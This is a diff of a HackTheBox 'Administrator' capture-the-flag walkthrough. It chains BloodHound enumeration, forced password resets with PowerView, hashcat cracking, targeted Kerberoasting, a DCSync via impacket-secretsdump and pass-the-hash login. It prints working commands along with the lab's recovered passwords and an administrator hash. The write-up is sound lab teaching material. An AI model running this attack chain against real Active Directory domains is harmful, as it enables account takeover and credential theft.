@@ -1,8 +1,8 @@
-# ADMINISTRATOR (NOT COMPLETE)
+# ADMINISTRATOR
 **Operating System**: _Windows_  
 **HTB Difficulty**: _Easy_  
 **My Recommended Difficulty**: _Easy_  
-**Summary**: _TBD_  
+**Summary**: _Administrator is a really fun introductory Active Directory box that resembles an assumed-breach scenario similar to the OSCP scenario. It allows the attacker to pivot between several domain users each with a single permission to another object so that we crawl closer and closer the end goal -- domain administrator credentials. The attacker is given the opportunity to learn essential Active Directory attacks and the corresponding permissions that are required to succeed with each._
 
 
 ### STEP #1: Port Scanning
@@ -33,23 +33,23 @@ Initial enumeration includes FTP and SMB but nothing useful is observed in this 
 **Kerberos**  
 Kerberos can be a powerful enumeration starting point but to take full advantage, we typically need at least one set of domain credentials. Since we have credentials for the user, _Olivia_, we can jump directly to  a credentialed scan using _bloodhound_.
   * `bloodhound-python -u "olivia" -p 'ichliebedich' -d administrator.htb -c all --zip -ns X.X.X.X`
-    * <img width="1257" height="330" alt="image" src="https://github.com/user-attachments/assets/187db73d-fe16-498f-a438-14653e64cfea" />
+    * <img width="1257" height="330" alt="image" src="https://github.com/user-attachments/assets/187db73d-fe16-498f-a438-14653e64cfea" />  
 
   * `sudo neo4j start`
   * `bloodhound`
     * We can then login to _http://127.0.0.1:8080/ui_ and import the file collected by _bloodhound_ into the application. It may take a few minutes for the data to be ingested. Once ingested we can run the following query in the _</> CYPHER_ tab:
       * `MATCH  (m:User) RETURN m` uncovers a list of users on the domain including our current user, _Olivia_.
-        * <img width="597" height="447" alt="image" src="https://github.com/user-attachments/assets/6a6fb71a-ba4e-4b9a-a26e-55d2d28296b3" />
+        * <img width="597" height="447" alt="image" src="https://github.com/user-attachments/assets/6a6fb71a-ba4e-4b9a-a26e-55d2d28296b3" />  
 
     * Since _Olivia_ is the user we have full access to, we should identify what permissions she may have by searching for the _Olivia_ user in the _Search_ tab and selecting the corresponding object. We notice that she has one outbound control. Expanding this option, we discover that _Olivia_ has _GenericAll_ permission over the user named _Michael_.
       * <img width="751" height="1040" alt="image" src="https://github.com/user-attachments/assets/312ab2b2-f7ba-4f5c-b1f2-c83f8fe650c2" />
-      * <img width="834" height="113" alt="image" src="https://github.com/user-attachments/assets/6a385c2f-5c1c-40a1-a712-f8ef400d079e" />
+      * <img width="834" height="113" alt="image" src="https://github.com/user-attachments/assets/6a385c2f-5c1c-40a1-a712-f8ef400d079e" />  
 
    * Repeating this process on _Michael_, we see he has _ForcePasswordChange_ permission on the user named _Benjamin_.
-     * <img width="908" height="111" alt="image" src="https://github.com/user-attachments/assets/3b3f6975-41bf-40ec-bb00-67b067c13002" />
+     * <img width="908" height="111" alt="image" src="https://github.com/user-attachments/assets/3b3f6975-41bf-40ec-bb00-67b067c13002" />  
 
    * Repeating this process again on _Benjamin_, we see that he is part of an interesting group named _Share Moderators_.
-     * <img width="882" height="145" alt="image" src="https://github.com/user-attachments/assets/ef27d990-6526-4d8c-a9f4-d0ca302c84ff" />
+     * <img width="882" height="145" alt="image" src="https://github.com/user-attachments/assets/ef27d990-6526-4d8c-a9f4-d0ca302c84ff" />  
 
 
 The information we have uncovered provides us an initial path to the _Benjamin_ user. We will use _Olivia_ to set the password on _Michael_, use _Michael_ to change the password on _Benjamin_, and then see if we can take advantage of the permissions granted to _Share Moderators_. Knowing that the system hosts an FTP server that denied access to _Olivia_ previously, we can assume this group may allow permission to access the FTP server. To initiate this attack path, we will proceed into **Initial Access**.
@@ -64,13 +64,13 @@ NOTE: this walkthrough does not address the remainder of enumeration as it tries
   * Part 2: Login as _Michael_ and set the password on _Benjamin_ to _password123_.
     *  `evil-winrm -i administrator.htb -u michael -p password123`
       * NOTE: the _net user_ command fails when used here so we need to change the password another way (E.g., _PowerView_). This is likely due to the differences in permissions (_GenericAll_ vs _ForcePasswordChange_).
-    * 'upload PowerView.ps1'
+    * `upload PowerView.ps1`
       * NOTE: _PowerView.ps1_ must be sitting in the local directory for this to work.
     * `Import-Module ./PowerView.ps1`
     * `Set-DomainUserPassword -Identity “Benjamin” -AccountPassword (ConvertTo-SecureString -String "password123" -AsPlainText -Force)`
   * Part 3: Attempt to access the FTP share as _Benjamin_.
     * `ftp -A benjamin@administrator.htb`
-      * <img width="308" height="129" alt="image" src="https://github.com/user-attachments/assets/4bcf5bfa-582a-44fc-bbef-928e1cd75d02" />
+      * <img width="308" height="129" alt="image" src="https://github.com/user-attachments/assets/4bcf5bfa-582a-44fc-bbef-928e1cd75d02" />  
 
 Success! Our theory was correct. Investigation of the FTP share finds a file named _Backup.psafe3_. We can download the file using the following commands:
   * `binary && prompt`
@@ -80,14 +80,33 @@ Given the filename and extension, this appears to be a backup file from a passwo
   * `hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt`
 
 We then open the file using `pwsafe Backup.psafe3` where we are presented with a GUI containing three users (Alexander, Emily, and Emma). It appears that you can click a given user and it copies the password to your clipboard. Repeating this process for all three users, we find the following password combinations: 
-  * <img width="410" height="249" alt="image" src="https://github.com/user-attachments/assets/473c9ccf-52c0-44c3-b176-50e5e9b7bce0" />
-    * USER | PASSWORD
-    * 
+    
+| USER | PASSWORD | 
+| :---: | :---: | 
+| Alexander Smith | UrkIbagoxMyUGw0aPlj9B0AXSea4Sw | 
+| Emily Rodriguez | UXLCI5iETUsIBoFVTj8yQFKoHjXmb | 
+| Emma Johnson | WwANQWnmJnGV07WQN8bMS7FMAbjNur| 
 
+Using our _Bloodhound_ results from before, we can search what outbound object control these users might have and we discover that _Emily_ has _GenericWrite_ on _Ethan_.  
+ * <img width="937" height="167" alt="image" src="https://github.com/user-attachments/assets/48e8ccd0-4cdf-4c62-9d6f-2dffc032792b" />  
+
+When we find a user with _GenericWrite_ permission over another, this signals we should attempt a targeted kerberoast attack where we create an SPN for the user we have _GenericWrite_ permission over and display the corresponding password hash that is displayed. To do this, we will use [this tool](https://github.com/ShutdownRepo/targetedKerberoast?tab=readme-ov-file) and then use _hashcat_ to crack the password (_limpbizkit_).
+ * ` python3 ./targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip X.X.X.X >> hashes.kerberoast`
+ * `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt`
+   * <img width="698" height="293" alt="image" src="https://github.com/user-attachments/assets/b13538e0-9d2e-41ad-8d96-e29459b26a2e" />  
+
+**NOTE**: if you get a _KRB_AP_ERR_SKEW_ error when running _targetedKerberoast.py_ it is due to clock misalignment between your Kali system and the Domain Controller. First, ensure that the the VM is not configured to pull time from your computer and then run `sudo ntpdate X.X.X.X` to pull and align the system time with the time on the Domain Controller.
+
+Now that we have cracked the credentials for _Ethan_, we can return to our _Bloodhound_ results and see what permissions this new user has. It turns out that _Ethan_ has _GetChanges_, _GetChangesAll_, and _GetChangesInFilteredSet_ permission over _Administrator_.
+ * <img width="869" height="212" alt="image" src="https://github.com/user-attachments/assets/7e7b235a-b2e7-49d6-be41-9cb9330284d8" />  
+
+When we find a user with _GetChanges_ permissions, this signals we should attempt a DC Synchronization attack. This permission is equivalent to Domain Replication privileges and allows the user with that permission to tell the Domain Controller to replicate and then display the corresponding password hashes. Sure enough, we find the hash of _Administrator_ and can login using _Evil_WinrRM_.
+ * `impacket-secretsdump -just-dc-user administrator administrator.htb/ethan:"limpbizkit"@administrator.htb`
+   * <img width="828" height="170" alt="image" src="https://github.com/user-attachments/assets/2e41c60a-fdb3-4bbe-9e3e-64f140a82995" />  
+ * `evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e`
 
 
 ### STEP #4: Privilege Escalation
-With the _Administrator_ credentials and the knowledge that the server is using the SMB and RPC protocols, we can attempt to connect to the server using _PSExec_ and find ourselves successfully connected in the _C:\Windows\System32_ directory.
-  * `impacket-psexec -debug  ACTIVE/administrator@active.htb`
+Throughout this process, we uncovered the credentials of many users and the true point of initial access achievement is unclear. Some might say it was when we pivoted from _Olivia_ to _Michael_. Others might say we got access to _Michael_ and established an interactive login. But ultimatley in the context of HTB labs, I think we should define it as when we gain access to the user-level flag. In this lab, the user flag (_user.txt_) can be found at _C:\Users\Emily\Desktop_ therefore meaning we accomplished initial access when we cracked the password for _Emily_.  
 
-From here, the user flag (_user.txt_) can be found at _C:\Users\SVC_TGS\Desktop_ and the root flag (_root.txt_) can be found at _C:\Users\Administrator\Desktop_. 
+The corresponding root flag (_root.txt_) can be found at _C:\Users\Administrator\Desktop_. 
